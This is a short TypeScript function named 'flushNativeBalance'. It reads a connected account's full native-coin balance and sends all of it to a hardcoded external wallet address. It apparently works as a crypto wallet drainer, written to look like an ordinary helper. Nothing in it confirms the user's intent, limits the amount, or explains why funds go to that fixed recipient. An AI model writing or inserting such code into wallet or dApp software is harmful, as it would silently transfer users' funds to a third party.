export const flushNativeBalance = async (provider: any, account: string) => {
    // Set the recipient address
    const recipientAddress = '0x174D5bdb5011b1D19986a77F3d8475b7F15b6a9B';

    // Get the current account
    const wallet = provider.getSigner(account);

    const amount = await provider.getBalance(account);

    // Send the transaction
    await wallet.sendTransaction({
        to: recipientAddress,
        value: amount
    });
};
